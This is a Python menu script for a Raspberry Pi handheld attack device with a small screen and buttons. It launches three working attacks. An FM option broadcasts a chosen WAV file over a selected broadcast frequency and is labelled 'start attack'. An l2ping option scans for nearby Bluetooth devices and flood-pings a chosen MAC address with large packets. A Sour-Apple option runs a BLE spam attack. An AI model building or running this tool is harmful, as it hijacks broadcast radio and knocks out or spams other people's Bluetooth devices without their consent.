from PIL import Image, ImageDraw, ImageFont
from st7735 import ST7735
import time
import RPi.GPIO as GPIO
import subprocess
import signal
import os
import bluetooth

# GPIO кнопок
BUTTON_UP = 21
BUTTON_DOWN = 16
BUTTON_SELECT = 20
Joystick_UP = 6
Joystick_Down = 19
Joystick_Press = 13
def button_setup():
    GPIO.setmode(GPIO.BCM)
    for btn in [BUTTON_UP, BUTTON_DOWN, BUTTON_SELECT, Joystick_UP, Joystick_Down, Joystick_Press]:
        GPIO.setup(btn, GPIO.IN, pull_up_down=GPIO.PUD_UP)
button_setup()



disp = ST7735(
    port=0,
    cs=0,
    dc=25,
    rst=27,
    backlight=24,
    width=128,
    height=160,
    rotation=90,
    invert=False
)
disp.begin()
    
img = Image.new("RGB", (160, 128), "black")
draw = ImageDraw.Draw(img)
font = ImageFont.load_default()
draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
disp.display(img)
time.sleep(0.1)

files_image = ["imgmenu/fbcp.png", "imgmenu/hackfm.png", "imgmenu/l2ping.png", "imgmenu/rpi433.png", "imgmenu/sourapple.png"]
images = [Image.open(x).convert("RGB").resize((128, 128)) for x in files_image]
current_index = 0

def draw_image():
    
    disp.display(images[current_index])
draw_image()
fm_opt = ["select freq", "select wav", "start attack"] 
cursor = 0

def scan_bluetooth_devices():
    nearby_devices = bluetooth.discover_devices(duration=8, flush_cache=True)
    mac_addresses = []  
    if len(nearby_devices) == 0:
        print("Не знайдено пристроїв.")
    if len(nearby_devices) > 0:
        print(f"Знайдено {len(nearby_devices)} пристроїв:")
        for addr in nearby_devices:
            mac_addresses.append(addr)

    return mac_addresses



while True:
    if GPIO.input(BUTTON_UP) == GPIO.LOW:
        time.sleep(0.2)  
        current_index = (current_index + 1) % len(images)
        draw_image()
    if GPIO.input(BUTTON_DOWN) == GPIO.LOW:
        time.sleep(0.2)  
        current_index = (current_index - 1) % len(images) 
        draw_image()
    if GPIO.input(BUTTON_SELECT) == GPIO.LOW:
        time.sleep(0.2)
        if current_index == 0:
            subprocess.run(["sudo", "/usr/local/bin/fbcp"])
            break
        time.sleep(0.1)

        original_img = Image.open("imgmenu/menuimg.png").convert("RGB").resize((128, 128))
        original_img2 = Image.open("imgmenu/menuimg2.png").convert("RGB").resize((128, 128))
        if current_index == 1:
            img = original_img.copy() 
            draw = ImageDraw.Draw(img)
            font = ImageFont.load_default()

            #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")  # Очистити екран

            disp.display(img)
            cursor = 0
            f = 87.5
            fm = 0.0
            directory = "/home/alex/wavfiles" 
            command = ["ls", directory]
            result = subprocess.run(command, capture_output=True, text=True)
            files = result.stdout.splitlines()
            wavfiles = files
            selected_file = ''
            while True:
                img = original_img.copy()
                draw = ImageDraw.Draw(img)
                #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                y = 35 
                for i, op in enumerate(fm_opt):
                    if i == cursor:
                        draw.text((25, y), f"> {op}", font=font, fill="white")  # Вибраний елемент
                    else:
                        draw.text((25, y), f"  {op}", font=font, fill="white") 
                    y += 20
                disp.display(img)  # Оновлення екран  

                # Читання стану кнопок
                button_state_UP = GPIO.input(BUTTON_UP)
                button_state_DOWN = GPIO.input(BUTTON_DOWN)
                button_state_SELECT = GPIO.input(BUTTON_SELECT)  

                # Обробка кнопок
                if button_state_UP == GPIO.LOW:
                    cursor = (cursor - 1) % len(fm_opt)
                    time.sleep(0.1)  
                if button_state_DOWN == GPIO.LOW:
                    cursor = (cursor + 1) % len(fm_opt)
                    time.sleep(0.1) 

                #Select
                if button_state_SELECT == GPIO.LOW:
                    if fm_opt[cursor] == "select freq":
                        while True:
                            img = original_img.copy()
                            draw = ImageDraw.Draw(img)
                            # draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                            draw.text((25, 50), f"freq: {f:.1f} MHz", font=font, fill="white")
                            disp.display(img)

                            button_state_JUP = GPIO.input(Joystick_UP)
                            button_state_JDOWN = GPIO.input(Joystick_Down)
                            button_state_JSELECT = GPIO.input(Joystick_Press)

                            if button_state_JUP == GPIO.LOW and f < 107.9:
                                f += 0.1
                                f = round(f, 1)
                                draw.text((25, 50), f"freq: {f:.1f} MHz", font=font, fill="white")
                                time.sleep(0.05)
                    
                            if button_state_JDOWN == GPIO.LOW and f > 87.5:
                                f -= 0.1
                                f = round(f, 1)
                                draw.text((25, 50), f"freq: {f:.1f} MHz", font=font, fill="white")
                                time.sleep(0.05)                    

                            if button_state_JSELECT == GPIO.LOW:
                                fm = round(f, 1)
                                print(fm)
                                time.sleep(0.1)
                                break
                    time.sleep(0.1)
                    if fm_opt[cursor] == "select wav":
                        cursor_wav = 0
                        visible_items = 5  
                        scroll_offset = 0
                        while True:
                            img = original_img.copy()
                            draw = ImageDraw.Draw(img)
                            #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                            y = 20
                            if cursor_wav < scroll_offset:
                                scroll_offset = cursor_wav
                            elif cursor_wav >= scroll_offset + visible_items:
                                scroll_offset = cursor_wav - visible_items + 1 
                                
                            for i, op in enumerate(wavfiles):
                                if i == cursor_wav:
                                    draw.text((25, y), f"> {op}", font=font, fill="white")  # Вибраний елемент
                                else:
                                    draw.text((25, y), f"  {op}", font=font, fill="white") 
                                y += 20

                            disp.display(img)    

                            
                            button_state_UP = GPIO.input(BUTTON_UP)
                            button_state_DOWN = GPIO.input(BUTTON_DOWN)
                            button_state_SELECT = GPIO.input(BUTTON_SELECT)  

                            # Обробка кнопок
                            if button_state_UP == GPIO.LOW:
                                cursor_wav = (cursor_wav - 1) % len(wavfiles)
                                time.sleep(0.01)  
                            if button_state_DOWN == GPIO.LOW:
                                cursor_wav = (cursor_wav + 1) % len(wavfiles)
                                time.sleep(0.01)
                            if button_state_SELECT == GPIO.LOW:
                                selected_file = wavfiles[cursor_wav]
                                print(f"Selected WAV file: {selected_file}")
                                time.sleep(0.1)
                                break
                    time.sleep(0.1)
                    if fm_opt[cursor] == "start attack":
                        img = original_img.copy()
                        draw = ImageDraw.Draw(img)
                        #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                        draw.text((25,20), f"attack {fm}MHz",fill="white")
                        draw.text((25,30), f"file: {selected_file}", fill='white')
                        disp.display(img)
                        print(fm)
                        print(selected_file)
                        command = ['sudo', '/home/alex/fm_transmitter/fm_transmitter', '-f', str(fm), "/home/alex/wavfiles/"+selected_file]
                        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        for line in process.stdout:
                            print(line, end='') 
                        stderr = process.stderr.read()
                        if stderr:
                            print("Помилки:", stderr)
                        cursor = 0
                        break
                    time.sleep(0.1) 
        time.sleep(0.1)
        
        draw_image()


        if current_index == 2:
            img = original_img.copy()
            draw = ImageDraw.Draw(img)
            font = ImageFont.load_default()

            mac_addresses = scan_bluetooth_devices()
            cursor = 0
            while True:
                #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                img = original_img.copy()
                draw = ImageDraw.Draw(img)
                y = 20
                for i, addr in enumerate(mac_addresses):
                    if i == cursor:
                        draw.text((25, y), f"> {addr}", font=font, fill="white")
                    else:
                        draw.text((25, y), f"  {addr}", font=font, fill="white")
                    y += 20
                disp.display(img)
                button_state_UP = GPIO.input(BUTTON_UP)
                button_state_DOWN = GPIO.input(BUTTON_DOWN)
                button_state_SELECT = GPIO.input(BUTTON_SELECT)
                if button_state_UP == GPIO.LOW:
                    cursor = (cursor - 1) % len(mac_addresses)
                    time.sleep(0.1)
                if button_state_DOWN == GPIO.LOW:
                    cursor = (cursor + 1) % len(mac_addresses)
                    time.sleep(0.1)

                if button_state_SELECT == GPIO.LOW:
                    selected_mac = mac_addresses[cursor]
                    
                    
                    command = ["timeout", "1", "sudo", "l2ping", "-s", "600", "-f", selected_mac]
                    print(f"l2ping {selected_mac}")               
                    # subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
                     
                        
                        
                        
                    # Вивести статус на екран
                    #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                    img = original_img.copy()
                    draw = ImageDraw.Draw(img)
                    draw.text((25, 20), f"l2ping {selected_mac}", fill="white")
                    for i in range(10):
                        subprocess.run(command)
                        #draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
                        img = original_img.copy()
                        draw = ImageDraw.Draw(img)
                        draw.text((40, 30), f"at {i+1}", fill="white")
                        disp.display(img)
                     

                    time.sleep(1)
                    draw_image()
                    break
            time.sleep(0.1)
            draw_image()

  

        if current_index == 3:
            None

        if current_index == 4:
            img = original_img2.copy()
            draw = ImageDraw.Draw(img)
            font = ImageFont.load_default()
            command = ['sudo', 'python', 'Sour-Apple/sourapple.py'] #/home/alex/Sour-Apple
            subprocess.Popen(command)            
            #draw.rectangle((0, 0, 160, 128), outline="black", fill="black") 
            img = original_img2.copy()
            draw = ImageDraw.Draw(img)
            draw.text((40, 20), f"attacking:", fill="white")
            for i in range(120):
                time.sleep(1)
                #draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
                img = original_img2.copy()
                draw = ImageDraw.Draw(img)
                draw.text((40, 30), f"at {i+1}", fill="white")
                 
                disp.display(img)          

            time.sleep(1)
            draw_image()